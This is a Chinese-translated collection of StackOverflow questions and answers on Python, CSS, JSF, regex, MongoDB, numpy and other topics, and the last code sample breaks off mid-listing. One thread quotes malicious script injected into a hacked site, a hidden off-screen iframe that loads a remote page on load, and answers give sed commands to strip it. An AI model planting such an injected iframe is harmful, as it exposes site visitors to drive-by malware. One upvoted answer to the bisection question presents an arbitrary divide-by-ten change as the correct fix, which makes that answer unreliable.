# StackOverflow 问答 12820000-12820999

# python - 二分搜索

> ID：12820003
> 
> 赞同：-1
> 
> 时间：2012-10-10T13:03:02.403
> 
> 标签：python, bisect

> **可能的重复：**
> [使用二等分搜索来确定](https://stackoverflow.com/questions/12804670/using-bisection-search-to-determine)

我已经发布了其他线程，但它没有收到答案，因此我试图提供我的一些工作以更清楚地说明。

我需要使用二分法来确定每月还款额，以便准确地在一年内还清债务。

这是一些代码：

```
originalBalance = 320000
annualInterestRate = 0.2
monthly_interest = annualInterestRate / 12
low = originalBalance/12
high = (originalBalance*(1 + monthly_interest)**12)/12
epsilon = 0.01
min_payment = (high + low)/2.0

while min_payment*12 - originalBalance >= epsilon:
    for month in range(0, 12):
        balance = (originalBalance - min_payment) * (1+monthly_interest)

    if balance < 0:
        low = min_payment
    elif balance > 0:
        high = min_payment
        min_payment = (high + low)/2.0
print "lowest payment: " + str(balance) 
```

但是，我收到的答案很离谱：298222.173851

我的朋友告诉我正确答案是：29157.09

这比我的要低很多......我想问题在于舍入（我还没有这样做）并在每次循环后保留平衡并在余额超过 0 时重置它。我不知道如何尝试这个问题请帮助某人:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-13T22:27:28.130

这是正确的。

```
originalBalance = 320000
annualInterestRate = 0.2
monthly_interest = annualInterestRate / 12
low = originalBalance/12
high = (originalBalance*(1 + monthly_interest)**12)/12
epsilon = 0.01
min_payment = (high + low)/2.0

while min_payment*12 - originalBalance >= epsilon:
    for month in range(0, 12):
        balance = (originalBalance - min_payment)/10 * (1+monthly_interest)

    if balance < 0:
        low = min_payment
    elif balance > 0:
        high = min_payment
        min_payment = (high + low)/2.0
print "lowest payment: " + str(balance) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-11T15:25:17.510

这就是你需要的

```
while abs(x) > epsilon:
    x = balance
    for month in range(0, 12):
        x = (x - ans) * (1+monthly_interest) 
```

# css - 文本溢出：链接上的省略号

> ID：12820007
> 
> 赞同：39
> 
> 时间：2012-10-10T13:03:14.327
> 
> 标签：css

我想在链接上使用 text-overflow 属性。我为段落工作，但不为链接工作。

这是HTML代码

```
<div>
  <ul>
    <li>
        <p>the text is too long</p>
    </li>   
    <li>
         <a href="javascript:alert('test')">the link is too long</a>
    </li>
  </ul>
</div> 
```

这是CSS代码：

```
a {
  white-space: nowrap;
  width:50px; 
  overflow: hidden;
  text-overflow: ellipsis;

}
p {
  white-space: nowrap;
  width:50px; 
  overflow: hidden;
  text-overflow: ellipsis;
} 
```

请参阅[http://jsfiddle.net/corinnekm/LLVDB/上的示例](http://jsfiddle.net/corinnekm/LLVDB/)

非常感谢你的帮助。

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2012-10-10T13:12:21.417

标签是`<a>`内联元素，您只能将省略号应用于块元素，尝试一下`a { display: block; }`就可以了

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2016-02-02T01:58:09.743

[http://primercss.io/utilities/](http://primercss.io/utilities/)有一组 css 截断规则。见[https://jsfiddle.net/illegs/g04L9xd6/](https://jsfiddle.net/illegs/g04L9xd6/)

```
.css-truncate.css-truncate-target,
.css-truncate .css-truncate-target {
display: inline-block;
max-width: 50px;
overflow: hidden;
text-overflow: ellipsis;
white-space: nowrap;
vertical-align: top
}

.css-truncate.expandable.css-truncate-target,
.css-truncate.expandable.css-truncate-target,
.css-truncate.expandable:hover .css-truncate-target,
.css-truncate.expandable:hover.css-truncate-target {
max-width: 10000px !important
}

<span class="css-truncate expandable">
<span class="branch-ref css-truncate-target"><a href="javascript:alert('test')">the link is too long</a></span> 
```

# jsf - 对象不支持此属性或方法与 primefaces omnifaces 超时组合

> ID：12820010
> 
> 赞同：2
> 
> 时间：2012-10-10T13:03:25.627
> 
> 标签：jsf, internet-explorer-8, primefaces, viewexpiredexception, omnifaces

设置：JSF、PrimeFaces 3.2、Omnifaces 1.1、JBoss AS 7.1.1、Final、Mojarra 2.1.7

我有一个简单的页面（如下所列），并且我已经设置了omnifaces 来处理ajax 调用的ViewExpiredExceptions。当下面列出的页面过期并且我单击 IE8 上的 primefaces 按钮 (ajax) 时，将显示过期的错误页面，但出现以下 javascript 错误：

消息：对象不支持此属性或方法，行：1 字符：5500 代码：0 URI：blah blah/mywebapp/javax.faces.resource/primefaces.js.xhtml?ln=primefaces&v=3.2

它似乎不会在其他浏览器上产生错误。

我的页面（home.xhtml）：

```
<ui:composition xmlns="http://www.w3.org/1999/xhtml"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:f="http://java.sun.com/jsf/core"
    template="/WEB-INF/templates/layout.xhtml"> 
    <ui:define name="body">
        <h:form id="form_search">
            <p:commandButton id="idbtn1"
                actionListener="#{bean.doSomething}"
                value="Do something (ajax)!">
            </p:commandButton>
            <p:commandButton id="idbtn2" ajax="false"
                actionListener="#{bean.doSomething}"
                value="Do something!">
            </p:commandButton>

        </h:form>
    </ui:define>
</ui:composition> 
```

超时错误页面：expired.xhtml

```
<ui:composition xmlns="http://www.w3.org/1999/xhtml"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    template="/WEB-INF/templates/layout.xhtml">
    <ui:define name="body">
    Your session has timed out.
    </ui:define>
</ui:composition> 
```

模板 layout.xhtml

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" 
"http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
        xmlns:h="http://java.sun.com/jsf/html"
    xmlns:f="http://java.sun.com/jsf/core"
    xmlns:ui="http://java.sun.com/jsf/facelets">

<f:view contentType="text/html">
    <h:head>
        <f:facet name="first">
            <meta http-equiv="X-UA-Compatible" content="IE=edge" />
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
            <meta http-equiv="Cache-Control" content="no-cache, no-store, must-    revalidate" />
            <meta http-equiv="Pragma" content="no-cache" />
            <meta http-equiv="Expires" content="0" />
        </f:facet>
        <base href="${facesContext.externalContext.requestContextPath}" />
    </h:head>
    <h:body>
        <ui:insert name="body"></ui:insert>
    </h:body>
</f:view>
</html> 
```

Web.xml 包括以下内容：

```
 <error-page>
        <exception-type>javax.faces.application.ViewExpiredException</exception-type>
        <location>/WEB-INF/errorpages/expired.xhtml</location>
    </error-page>

    <filter>
        <filter-name>facesExceptionFilter</filter-name>
        <filter-class>org.omnifaces.filter.FacesExceptionFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>facesExceptionFilter</filter-name>
        <servlet-name>Faces Servlet</servlet-name>
    </filter-mapping> 
```

当我在过期后单击第二个按钮时，过期页面显示没有 javascript 错误。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:53:47.917

`update="@all"`这是基于 IE 的浏览器中 PrimeFaces 的一个已知问题。整个视图被替换为`document.write()`，但是基于 IE 的浏览器无法正确加载/初始化任何`<script>`资源。另请参阅此[PrimeFaces 论坛主题](http://forum.primefaces.org/viewtopic.php?p=67176#p67176)。这将在[PrimeFaces 版本 3.4.2](http://code.google.com/p/primefaces/issues/detail?id=4731)中得到解决。

在此之前，您可以使用以下 JavaScript 解决它

```
var originalPrimeFacesAjaxResponseFunction = PrimeFaces.ajax.AjaxResponse;
PrimeFaces.ajax.AjaxResponse = function(responseXML) {
   var newViewRoot = $(responseXML.documentElement).find("update[id='javax.faces.ViewRoot']").text();

    if (newViewRoot) {
       $('head').html(newViewRoot.substring(newViewRoot.indexOf("<head>") + 6, newViewRoot.indexOf("</head>")));
       $('body').html(newViewRoot.substring(newViewRoot.indexOf("<body>") + 6, newViewRoot.indexOf("</body>")));
    }
    else {
        originalPrimeFacesAjaxResponseFunction.apply(this, arguments);
    }
}; 
```

需要在PrimeFaces 自己的 JS 资源*之后加载；*这可以通过在`<h:body>`with中引用它来完成`target="head"`。

```
<h:body>
    <h:outputScript name="script.js" target="head">
    ...
</h:body> 
```

请注意，这假设当前视图正在使用 PrimeFaces 组件，这些组件应该反过来强制自动包含`primefaces.js`和`jquery.js`脚本。否则，您必须手动声明它们。

# c# - 哪一个会跑得更快？

> ID：12820012
> 
> 赞同：-3
> 
> 时间：2012-10-10T13:03:29.887
> 
> 标签：c#, sqldatareader, sqldataadapter

> **可能重复：**
> [填充数据表时，数据读取器是否比数据集更快？](https://stackoverflow.com/questions/334658/is-datareader-quicker-than-dataset-when-populating-a-datatable)

```
 public DataTable GetReviewsId(Objects myObjects)
 {
     DataTable tblBindReviews = new DataTable();
     string Query = "";
     try
     {
         Query = "select distinct ProductId from tblReview where ProductId in (select ProductId from tblProduct where R=0 and T=0)";
         /*SqlConnection mySqlConnection = this.SetDatabaseConnection();
         SqlDataAdapter mySqlDataAdapter = new SqlDataAdapter(Query, mySqlConnection);
         mySqlDataAdapter.Fill(tblBindReviews);*/
         /*mySqlConnection.Open();
         SqlCommand cmd = new SqlCommand(Query,mySqlConnection);
         tblBindReviews.Load(cmd.ExecuteReader());*/
     }
     catch (SqlException ex)
     {
         throw new Exception(ex.Message);
     }
     finally
     {
         this.ClosedatabaseConnection();
     }
     return tblBindReviews;
 } 
```

在上面的代码中，我编写了两种检索数据的方法（每种都在注释部分内），一种使用数据适配器，另一种使用数据读取器。两者中哪一个会跑得更快？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:06:16.000

DataReader 是最快的方法。在任何情况下都比 DataAdapter 更快，因为 DataAdapter 在内部使用 DataReaders 并执行其他操作（适用于数据集多个表，......）

![DbDataAdapter - FillInternalMethod](../Images/471309688f7eef3b4a4ab1e7346e209d.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:06:28.403

如果你执行`select operations`我建议你使用`SqlDataReader`

一次在内存中只有一条记录，而不是整个结果集

与您在一次迭代中获得的速度一样快

让您更快开始处理结果

注意：

使用 SqlDataAdapter 你有更高的内存使用，你等到所有数据都被加载后再使用它

# iphone - 将带有动画的矢量图形嵌入到 iOS 原生应用程序中

> ID：12820017
> 
> 赞同：5
> 
> 时间：2012-10-10T13:03:46.947
> 
> 标签：iphone, ios, flash, animation, vector

我正在寻找一种在原生 iOS 应用程序中显示动画矢量图形的方法。

艺术家在矢量中绘制一个字符，然后将其导入 Flash 并对其进行动画处理。为什么是矢量，而不是精灵？因为这个角色有很多东西和动画。如果我使用帧动画，我需要为所有外观变体渲染所有动画变体。骨骼精灵动画看起来很糟糕。现在我尝试 Adob​​e 的解决方案 - CreateJS 的 Flash Toolkit。我把结果放在 UIWebView 中。一切似乎都在工作，我可以用其他元素替换矢量元素并分别为每个元素启动动画（这就是我需要的）。但是有一个性能问题，所以我不能使用更复杂的矢量图形。而且该解决方案看起来不是原生的。

也许还有其他解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-17T21:52:24.713

如果您不反对使用 Starling（[Starling 主页](http://gamua.com/starling/)），我发现一些有趣的信息可能会从中受益：[flash-movieclip-converter-preserves-display-list-hierarchy](http://forum.starling-framework.org/topic/flash-movieclip-converter-preserves-display-list-hierarchy)

这里还有一些 GIT 存储库，您可以查看它们可能会有所帮助： [https ://github.com/zenrobin/FlashMovieClipConverter](https://github.com/zenrobin/FlashMovieClipConverter) [https://github.com/philippecapouillez/FlashMovieClipConverter](https://github.com/philippecapouillez/FlashMovieClipConverter)

希望有帮助。

# html - 哪些字体是新一代浏览器上 HTML 的标准字体？

> ID：12820019
> 
> 赞同：2
> 
> 时间：2012-10-10T13:03:51.767
> 
> 标签：html, css

当我开始研究 HTML 时，只有很少的字体可供我们用于在每个浏览器上呈现的 HTML

Arial, Verdana, Times new roman, Georgia。现在，从 2003 年开始，浏览器发生了很大变化，是否有任何新的兼容字体适用于每个浏览器或我们仍然回到 2000 年初的字体？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-10T13:14:34.563

Naraj，我想你指的是`web-safe fonts.`这些是每个用户在他们的机器上都有的字体。

在我开始之前，让我试着解释一下字体加载是如何工作的。当您访问网站时，该`CSS`文件会告诉您的计算机要查找的字体文件。如果您的计算机上没有该字体文件，它将不会显示！幸运的是，浏览器很聪明，在这种情况下会使用默认值，比如 Arial。

无论如何，您引用的字体列表是大多数计算机在您开箱即用时附带的字体列表。因此，用户很可能会拥有它们，并且如果您引用它们，网站将正确显示（而不是求助于替代方案）。另一方面，像 Helvetica 这样的字体不会出现在每台机器上，因为它没有随 PC 提供。如果您尝试在您的网站上使用 Helvetica，大多数 PC 用户不会看到它显示！

话虽如此，您现在可以在技术上在任何网站上使用任何字体。这是通过 CSS 规则实现的`@font-face`。它的作用是让您指向服务器上字体的位置，然后用户可以在那里下载和使用它。

使用`@font-face`. 首先是用户必须下载字体，因此它会为您的页面显示增加一点延迟。第二个也是更关键的问题是您需要拥有字体许可证才能使用它。您不能只在服务器上上传 Helvetica，因为其他人拥有该字体。您需要从像[https://typekit.com/](https://typekit.com/)这样的字体经销商网站购买许可证才能像这样使用它们！

正如其他人所提到的，有一些很棒的网络服务可以让用户使用`@font-face`字体，比如[Google Web Fonts](http://www.google.com/webfonts#ChoosePlace:select)。

尽管如此，这份名单`web-safe fonts`并没有太大变化。如果您不使用`@font-face`，您可能应该坚持使用 2003 年的相同字体列表。这是今年[的更新列表。](http://www.ctc-aspire.co.uk/blog-post-36-web-safe-fonts-157-34.html)

希望这可以帮助！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:07:15.567

浏览器在这里有点无关紧要。字体来自“系统”，即特定用户所在的计算机，而不是浏览器本身。

字体从本地机器加载。

不过，现在有很多字体服务。一个不错的免费字体是 Google 字体： [http ://www.google.com/webfonts](http://www.google.com/webfonts)

试试看！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:46:22.523

没有任何。没有“网络安全字体”。没有一种字体可以期望在所有浏览情况下都可用。这取决于系统（计算机），而不是浏览器。关键是字体是随操作系统和一些应用软件一起提供的，但通常不随浏览器一起提供。

甚至 Arial、Verdana、Times New Roman 和 Georgia 也存在于不同的版本中（因此使用特定的字体系列名称，您可能会得到略有不同的结果），并且它们在某些计算机中是缺失的。一方面，Android 没有这些字体（Android 上可用的字体并未预装在其他系统中，因此仅此一项就证明没有网络安全字体）。

通过 使用的可下载字体，也称为网络字体，`@font-face`通常被描述为允许您在页面上嵌入任何字体，以便每个人都能看到该字体中的文本。这部分是正确的，但只是部分正确，并且存在许多陷阱和不同的主题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:07:46.440

我认为你混淆了一些东西。如果您定义字体 - 使用 face 属性 - 浏览器会尝试从客户端文件系统加载此字体。如果他找不到它，他使用配置的默认字体。字体列表也将从客户端文件系统中读取。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-10T13:07:57.810

使用大多数现代浏览器，您可以使用 Web 字体在任何操作系统/浏览器上呈现您想要的任何字体。

当然，许多字体是特定于操作系统的，因此将在 OS X 上呈现的字体在 Windows 上不可用。

网络字体解决了这个问题。Google 提供托管网络字体：[http ://www.google.com/webfonts](http://www.google.com/webfonts)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-10T13:08:48.587

你可以使用任何你想要的字体。如果该字体在用户的计算机中可用，它将正确显示，否则，浏览器将默认使用某种“标准”字体。如果您想使用某些操作系统（或所有操作系统）不附带的自定义字体，那么您需要使用 CSS3 @font 属性、Google 字体或其他解决方案。

# linux - 需要使用linux命令删除cakephp脚本中的病毒代码

> ID：12820020
> 
> 赞同：2
> 
> 时间：2012-10-10T13:03:58.000
> 
> 标签：linux, cakephp, grep, virus

昨天我的网站被黑了，它的代码如下：

```
<script>  
    function frmAdd() { 
        var ifrm = document.createElement('iframe'); 
        ifrm.style.position='absolute'; 
        ifrm.style.top='-999em'; 
        ifrm.style.left='-999em'; 
        ifrm.src = \"http://fenwaywest.com/media/index.php\";
        ifrm.id = 'frmId';
        document.body.appendChild(ifrm);
    };
    window.onload = frmAdd;
</script>"; 
```

当我使用以下命令搜索服务器以查找受影响的文件时

```
grep -r "<script>  function frmAdd()" /path/ 
```

我有2000多个文件。

现在我只需要删除该行。拜托，有人可以指导该命令仅删除所有 2000 个文件中的该行吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:10:58.810

先备份！然后，你可以尝试这样的事情：

```
grep -lr " function frmAdd" /path/ | xargs sed -i '/ function frmAdd/d' 
```

这将删除与该正则表达式匹配的任何行。它还假设路径不包含空格（希望这里是一个合理的假设）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T19:37:17.883

在打印用户数据时尝试使用 CakePHP sanitize Class：

```
echo Sanitize::html($badString); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T07:12:29.537

你有没有清除病毒？因为我感染了同样的病毒。我的网站在 joomla。

编辑：

我使用代码：

```
grep -lr " function frmAdd" public_html | xargs sed -i '/ function frmAdd/d' 
```

但如果你有这样的东西

```
 <html><body bgcolor="#FFFFFF"><!--ef09d2--><script>  function frmAdd() { var ifrm = document.createElement('iframe'); ifrm.style.position='absolute'; ifrm.style.top='-999em'; ifrm.style.left='-999em'; ifrm.src = "http://fenwaywest.com/media/index.php";ifrm.id = 'frmId';document.body.appendChild(ifrm);};window.onload = frmAdd;</script><!--/ef09d2-->
</body></html> 
```

这只会返回`</body></html>`

# iphone - Bundle Identifier 中的 -temp-caseinsensitive-rename

> ID：12820022
> 
> 赞同：12
> 
> 时间：2012-10-10T13:04:03.847
> 
> 标签：iphone, ios, xcode, xcode4

我创建了名为 myap 的应用程序。与此应用程序一起在 AppID com.mydomain.myapp 中创建了 Bundle Identifier 并创建了新的配置文件。之后我注意到我的应用程序拼写错误，所以我从“myap”重命名为“myapp”，期望捆绑标识符会相应更改。然而令我惊讶的是，我将捆绑标识符分配为“com.mydomain.myapp-temp-caseinsensitive-rename”。这是什么？我试图在目标信息选项卡中显式更改捆绑标识符，但应用程序正在呻吟。我应该怎么做才能使应用程序及其捆绑包走上正轨？

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2014-01-15T02:49:28.813

在 XCode 中，转到 Build Settings 并更改 Packaging 下的 Product Name

# regex - 正则表达式 (Regex) 仅用于数字 (0-9)，后跟点

> ID：12820024
> 
> 赞同：1
> 
> 时间：2012-10-10T13:04:11.793
> 
> 标签：regex

我想为仅数字（0-9）后跟点构建一个正则表达式。这最多可以持续 4 次。诀窍是没有必要继续。

例如：

```
1234 is OK  
1234.1234 is OK  
1234.1234.1234 is OK  
1234.1234.1234.1234 is OK 
```

不好：

```
asdf NOT OK  
1234.. NOT OK 
1234..1234 NOT OK  
1234,-/etc. NOT OK  
123asd NOT OK  
1234.1234asd NOT OK 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:09:10.203

如果我对您的理解正确，这应该有效：

```
^[0-9]+(\.[0-9]+){0,3}$ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-10T13:06:29.110

这是针对 C# 的吗？

```
Regex regex = new Regex(@"^\d+(\.\d+){0,3}$"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-10T13:06:33.050

这个怎么样：

```
^\d+(\.\d+){0,3}$ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T14:26:48.563

我不确定我是否同意接受的答案。我无法使接受的答案起作用。

据我了解，接受的答案是匹配的：-

> `^` 字符串的开头
> 
> `[0-9]+` 一个或多个数字 0 到 9 这也可以简写 \d
> 
> `(` 重复开始
> 
> `\.` 单个句点（转义以确保不被视为通配符）
> 
> `[0-9]+` 一个或多个数字 0 到 9 这也可以简写 \d
> 
> `)` 重复结束
> 
> `{0,3}` 重复 0 或 3 次
> 
> `$` 字符串结尾

因此我们可能会匹配例如

1234.12.123456789.1234 或

1234.12 或

123.1.234 或

1

我可能会误解一些东西，但这不符合 SO 示例给出的规范。

这不应该是

```
^\d{4}(\.\d{4}){0,3}$ 
```

IE

> `^` 字符串的开头
> 
> `\d{4}` 四位数
> 
> `(` 重复开始
> 
> `\.` 单个句点（转义以确保不被视为通配符）
> 
> `\d{4}` 4 位数
> 
> `)` 重复结束
> 
> `{0,3}` 重复 0 或 3 次
> 
> `$` 字符串结尾

这将匹配

1234 或

1234.1234 或

1234.1234.1234 或

1234.1234.1234.1234

我读为符合要求。

# javascript - 通过循环遍历数组来填充表单

> ID：12820025
> 
> 赞同：1
> 
> 时间：2012-10-10T13:04:14.100
> 
> 标签：javascript, jquery

我正在尝试通过循环浏览由 php 查询生成的 JSON 结果集来填充 id 为“amenduser”的表单。

该表单有 15 个字段，因此使用 $('#amenduser input[name="id"]).val(data.id); 处理 jquery 中的每个表单元素并不是一个问题。等等等等

为了使代码更加用户友好（和可移植），我尝试循环遍历 JSON 数据，如下所示：

```
for (var key in userDetails) {
    var elem = '#amenduser input[name="' + key + '"]';
    $(elem).val(userDetails.key);
    console.log(key, elem);
} 
```

此代码不起作用！控制台日志示例：

```
username #amenduser input[name="username"] 
```

在我看来，元素 id 的形成是正确的，但并不快乐。

我会很感激任何想法，因为到目前为止我已经花了几个小时。

罗杰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:18:49.380

我认为问题可能出在`$(elem).val(userDetails.key)`尝试：`userDetails[key]`

# javascript - 如何使用 $routeProvider 的解析参数来使用显式注入器声明？

> ID：12820026
> 
> 赞同：3
> 
> 时间：2012-10-10T13:04:32.470
> 
> 标签：javascript, dependency-injection, angularjs

[$routeProvider](http://docs.angularjs.org/api/ng.$routeProvider) `resolve`参数可以允许向控制器函数注入额外的依赖项。**如何将它与显式依赖注入声明结合起来？**

示范：

```
angular.module('myModule', [])
    .config(function($routeProvider) {
        $routeProvider.
            when('/tabOne', { templateUrl : 'tabOne.html', controller: TabOne, 
                resolve: {
                  someDependency: SomeDependency.factoryFunction
                }
     });

}); 
```

接着：

```
TabOne.$inject = [ '$scope', 'someFirstService', 'someOtherService' ]; 
```

如您所见，上面的 DI 声明将向我的`TabOne`控制器 (`someFirstService`和`someOtherService`) 注入两个服务。这两个工作正常，但我希望我的路线只有在`someDependency`解决并注入之后才能改变`TabOne`。如果我只是添加`someDependency`到控制器函数的参数列表中，它将因 DI 错误而失败。

任何想法如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T20:45:48.283

首先，您的控制器是否只需要等到依赖关系在被调用之前被解析，还是它实际上需要 SomeDependency.factoryFunction 的解析值？

情况似乎是后者：您想要解析值。

在这种情况下，一种可行的方法是拥有两个 TabOne 控制器。

```
angular.module('myModule', [])
    .config(function($routeProvider) {
        $routeProvider.
            when('/tabOne', { templateUrl : 'tabOne.html', controller: TabOneRouted, 
                resolve: {
                  someDependency: SomeDependency.factoryFunction
                }
     });

});

function TabOne($scope, someFirstService, someOtherService) {
  ... code here ...
}

function TabOneRouted($scope, someFirstService, someOtherService, someDependency) {
    TabOne($scope, someFirstService, someOtherService);
    ... your code dealing with someDependency here ...
  } 
```

# mongodb - 针对 MongoDB 中的副本集运行脚本

> ID：12820027
> 
> 赞同：13
> 
> 时间：2012-10-10T13:04:41.370
> 
> 标签：mongodb

我有 3 个节点的副本集，我想每天结束对它运行一个清理脚本。如果只有单个节点，我会做一个简单的 bash 脚本：

```
~/mongo/bin/mongo host:port cleanupScript.js 
```

但是由于我想对副本集运行相同的脚本，所以我不能使用这种方法。我需要以某种方式找到哪个节点是主节点并针对该节点运行脚本。

所以问题是：有没有办法对整个副本集运行脚本并让`mongo`进程选择主节点并在其上执行？

谢谢！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-11T03:28:22.483

mongo shell 可以直接连接到副本集——这适用于 2.4（当前）、2.2（以前）和 2.0（之前的版本）。

假设您有一个名为的副本集`myrs`并且您的主机是`host1:27017`and `host2:27017`，请使用以下语法：

`mongo --host myrs/host1:27017,host2:27017`

shell 将计算出其余的，包括连接到主节点，如果主节点退出或消失，一旦它被选中，它将重新连接到新的主节点。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-10T16:59:52.900

不幸的是，'mongo' shell 不支持连接到副本集：仅连接到单个节点。如果你想这样做，你有两个选择：

*   使用不同的语言，它支持与副本集建立连接。（PHP、Python、Perl、Java 和 Ruby 都支持这一点。）
*   有一个运行“rs.status()”命令的驱动程序脚本，解析该命令的输出，并确定当前的主节点。如果不是您连接的节点，则重新连接到正确的主节点

我希望我有一个更好的答案给你。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-10T13:35:29.700

我通常为副本集中的节点设置优先级。这让我可以自由选择哪个节点应该获得读写负载。

在您的情况下，我认为，如果您为节点设置优先级，那么您始终可以针对最高优先级节点运行脚本，因为该节点几乎一直都是主节点。

设置优先级非常简单直接。您可以查看此链接[http://docs.mongodb.org/manual/tutorial/force-member-to-be-primary/](http://docs.mongodb.org/manual/tutorial/force-member-to-be-primary/)

我希望这能解决你的问题。

OKAY.. 可能这就是你需要的..

```
#!/bin/bash

PRIMARY=`~/mongo/bin/mongo localhost:27017 --eval "printjson(rs.isMaster())" | grep "primary" | cut -d"\"" -f4`

echo "$PRIMARY"

~/mongo/bin/mongo "$PRIMARY" cleanupScript.js 
```

在任何节点上运行它，它将为您提供主节点的“服务器：端口”。给出 mongo 可执行文件的完整路径。只是为了避免错误。

PS：整个命令在反引号中。不知何故，那些是不可见的，所以想告诉你。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-06-08T17:59:39.660

对于 mongo 的更新版本（我使用的是 4.4.4），您可以指定副本集名称，并且只能指定一个主机（任何一个），mongo 会弄清楚并将您放入 PRIMARY 上的 shell：

```
mongo --host my_repl_name/any_node_host:port --eval "..." 
```

例如，当您在具有重复本地主机名的多个区域的云中运行时，我发现这非常有用。

我测试了这个正在运行的 mongo v4.4.4。

# python - numpy 将 2D 整数记录转换为 2D 浮点记录

> ID：12820028
> 
> 赞同：2
> 
> 时间：2012-10-10T13:04:44.920
> 
> 标签：python, numpy

我想将`[(1, 2, 3) (2, 2, 3)]`整数类型的记录转换为浮点类型数组`[(1.0, 2.0, 3.0), (2.0, 2.0, 3.0)]`。但是，当我发出命令时`c.astype('float')`，我得到的输出是`rec.array([ 1., 2.])`. 为什么从数组中删除其他元素？

有人可以给我正确的解决方案吗？我做对了吗？

**更新** 我从 3 个像这样的不同数组中创建了记录 - `d=np.rec.fromarrays([a, b, c], names='x,y,z')`为了对它们进行排序并执行一些操作。

这是完整的代码 -

```
a=[1,2]
b=[2,2]
c=[3,3]
d=np.rec.fromarrays([a, b, c], names='x,y,z')
print d
d.astype('float')
print d 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:34:30.277

不优雅但（显然）工作：

```
In [23]: import numpy as np

In [24]: a=[1,2]

In [25]: b=[2,2]

In [26]: c=[3,3]

In [27]: d=np.rec.fromarrays([a, b, c], names='x,y,z')

In [28]: d
Out[28]: 
rec.array([(1, 2, 3), (2, 2, 3)], 
      dtype=[('x', '<i4'), ('y', '<i4'), ('z', '<i4')])

In [29]: d.astype([(k, float) for k in d.dtype.names])
Out[29]: 
rec.array([(1.0, 2.0, 3.0), (2.0, 2.0, 3.0)], 
      dtype=[('x', '<f8'), ('y', '<f8'), ('z', '<f8')]) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-10T13:06:16.170

```
>>> np.array([(3, 0, 1)]).astype('float')
array([[ 3.,  0.,  1.]]) 
```

你的代码看起来不一样吗？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:17:26.420

嗯......我能哄它的唯一方法是：

```
a = np.rec.array([(1,2,3)])
np.array(list(a[0]),dtype='float') 
```

对于 N 维数组：

```
a = np.array(map(list,d),dtype='float') 
```

希望其他人会出现更好的方法......

# c++ - 检测几乎为零并将它们替换为 0.0 或将它们保留为小数字会更快吗？

> ID：12820029
> 
> 赞同：0
> 
> 时间：2012-10-10T13:04:49.443
> 
> 标签：c++, visual-studio-2008, math, numerical-methods

我正在编写一个数值分析程序，有时微积分会给出一些非常小的系数，即`a0=1.234542e-12`

如果我计算一个包含 10 个值的数组（其中 6 个是小数字），然后我将它们中的每一个乘以 t^x（仅作为示例）为 x=1:10，那么计算速度更快吗？

*   只保留少数原样
*   检测小于 0.0 的数字`threshold`并将其替换为 0.0

问题主要是因为编译器可能只是不计算一个数字乘以 0，因为它总是 0，或者它可能只是将它相乘，而我让程序变慢以添加`if`条件只是为了检查一个数字是否是0 与否。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:44:48.340

如果您在问，就像您看起来的那样，这两种操作中哪个更快：

1.  乘以一个数字向量，包括一些接近 0.0 的数字。
2.  通过设置为 0.0 的数字向量运行接近 0.0 的数字，然后乘以向量。

好吧，我认为在限制中 1 会比 2 快。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:42:08.277

我假设数组不是常量，而是程序的中间结果。

那么乘以 0 和乘以一个小数在速度上就完全没有区别了，因为这两种情况下执行的机器码是完全一样的。编译器不知道数组的内容。

# c# - Httpwebrequest + 线程 = 超时？

> ID：12820034
> 
> 赞同：0
> 
> 时间：2012-10-10T13:04:57.670
> 
> 标签：c#, multithreading, httpwebrequest

我正在线程化以下函数，当我运行超过 10 个线程时，我开始得到一堆超时连接..

我已添加`_wReq.ServicePoint.ConnectionLimit = 100;`到方法中，并将以下内容添加到我的 app.config

```
<system.net>
    <connectionManagement>
        <add address = "*" maxconnection = "200" />
    </connectionManagement>
</system.net> 
```

这是方法：

```
public string websocket(string proxy, string URL)
{
    string _html = "";
    HttpWebResponse _wResp = null;

    try
    {
        HttpWebRequest _wReq;
